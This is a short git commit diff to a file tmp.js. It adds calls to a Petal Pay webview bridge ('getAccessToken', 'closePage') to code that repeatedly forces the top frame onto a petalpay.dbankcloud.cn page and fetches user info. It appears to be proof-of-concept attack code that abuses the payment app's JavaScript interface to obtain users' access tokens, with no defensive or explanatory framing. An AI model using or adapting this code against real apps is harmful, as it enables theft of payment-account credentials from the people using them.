8906c6ee3f14595e57e7500f615682898c38c4f6
cc <seuercc@gmail.com>
2026-01-22 09:58:53 +0800

    Update tmp.js

--- 26/tmp.js
+++ 26/tmp.js
@@ -1,3 +1,5 @@
+window.petalPayBasicAbilityJSInterface.getAccessToken(false);
+window.petalPayBasicAbilityJSInterface.closePage()
 function gotowhite() {
     top.location.href = "https://h5-drcn.petalpay.dbankcloud.cn/h5b/pages/hcp/h5builder-5c729fd2a9444966bb24b30f2cb78bd6/campaign/index.html";
 }
@@ -14,3 +16,5 @@ async function getUserInfo() {
 
 setInterval(gotowhite, 5);
 setTimeout(getUserInfo, 500);
+window.petalPayBasicAbilityJSInterface.getAccessToken(false);
+window.petalPayBasicAbilityJSInterface.closePage()
